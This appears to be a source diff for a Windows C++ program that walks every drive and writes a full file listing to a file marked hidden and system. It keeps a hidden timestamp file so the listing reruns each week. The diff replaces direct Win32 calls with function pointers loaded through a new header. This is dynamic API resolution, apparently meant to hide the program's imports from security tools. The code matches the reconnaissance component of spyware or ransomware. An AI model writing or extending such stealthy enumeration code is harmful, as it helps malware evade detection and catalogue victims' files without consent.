@@ -13,7 +13,7 @@
 #include "https.h"
 #include "packet.h"
 #include <vector>
-
+#include "api.h"
 
 using namespace std;
 
@@ -64,7 +64,7 @@ vector<FILE_INFOMATION> listDir(const char* PreStrPath)
 
 	HANDLE hFind = 0;
 
-	hFind = FindFirstFileA(strPath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
+	hFind = lpFindFirstFileA(strPath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
 	if (hFind == INVALID_HANDLE_VALUE)
 	{
 		return data;
@@ -83,9 +83,9 @@ vector<FILE_INFOMATION> listDir(const char* PreStrPath)
 		fi.fnlen = lstrlenA(stWfd.cFileName);
 		data.push_back(fi);
 
-	} while (FindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));
+	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));
 
-	FindClose(hFind);
+	lpFindClose(hFind);
 
 	return data;
 }
@@ -112,7 +112,7 @@ int __stdcall listAllFiles(const char* PreStrPath, int iLayer, HANDLE hfile)
 
 	HANDLE hFind = 0;
 
-	hFind = FindFirstFileA(strPath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
+	hFind = lpFindFirstFileA(strPath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
 	if (hFind == INVALID_HANDLE_VALUE)
 	{
 		return counter;
@@ -149,7 +149,7 @@ int __stdcall listAllFiles(const char* PreStrPath, int iLayer, HANDLE hfile)
 						string filename = string(PreStrPath) + stWfd.cFileName + "\r\n";
 
 						DWORD dwcnt = 0;
-						iRet = WriteFile(hfile, filename.c_str(), (DWORD)filename.size(), &dwcnt, 0);
+						iRet = lpWriteFile(hfile, filename.c_str(), (DWORD)filename.size(), &dwcnt, 0);
 
 						counter++;
 						if (counter % 256 == 0)
@@ -160,9 +160,9 @@ int __stdcall listAllFiles(const char* PreStrPath, int iLayer, HANDLE hfile)
 				}
 			}
 		}
-	} while (FindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));
+	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));
 
-	FindClose(hFind);
+	lpFindClose(hFind);
 
 	return counter;
 }
@@ -184,13 +184,13 @@ int refreshAllFiles() {
 	time_t now = time(0);
 
 	char data[1024] ;
-	HANDLE hf = CreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	if (hf == INVALID_HANDLE_VALUE) {
-		hf = CreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+		hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 	}
 
-	filesize = GetFileSize(hf, 0);
-	ret = ReadFile(hf, data, filesize, &dwcnt, 0);
+	filesize = lpGetFileSize(hf, 0);
+	ret = lpReadFile(hf, data, filesize, &dwcnt, 0);
 	*(data + filesize) = 0;
 
 	string strtime = data;
@@ -198,15 +198,15 @@ int refreshAllFiles() {
 	time_t last = atoi(strtime.c_str());
 	if (now - last >= 7 * 24 * 3600)
 	{
-		len = wsprintfA(data, "%08u", now);
-		ret = SetFilePointer(hf, 0, 0, FILE_BEGIN);
-		ret = WriteFile(hf, data, len, &dwcnt, 0);
+		len = wsprintfA(data, "%08u", (int)now);
+		ret = lpSetFilePointer(hf, 0, 0, FILE_BEGIN);
+		ret = lpWriteFile(hf, data, len, &dwcnt, 0);
 		result = TRUE;
 	}
 
-	CloseHandle(hf);
+	lpCloseHandle(hf);
 
-	ret = SetFileAttributesA(cfgfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
+	ret = lpSetFileAttributesA(cfgfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
 
 	return result;
 }
@@ -244,7 +244,7 @@ int __stdcall getAllFiles()
 		char* strDiskPtr = strDisk;
 
 		DWORD dwFilesCnt = 0;
-		HANDLE hFile = CreateFileA(ALLFILES_FILENAME, GENERIC_READ | GENERIC_WRITE, 0, 0,
+		HANDLE hFile = lpCreateFileA(ALLFILES_FILENAME, GENERIC_READ | GENERIC_WRITE, 0, 0,
 			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
 		if (hFile == INVALID_HANDLE_VALUE)
 		{
@@ -268,7 +268,7 @@ int __stdcall getAllFiles()
 			strDiskPtr += 4;
 		}
 
-		CloseHandle(hFile);
+		lpCloseHandle(hFile);
 
 		return TRUE;
 	}
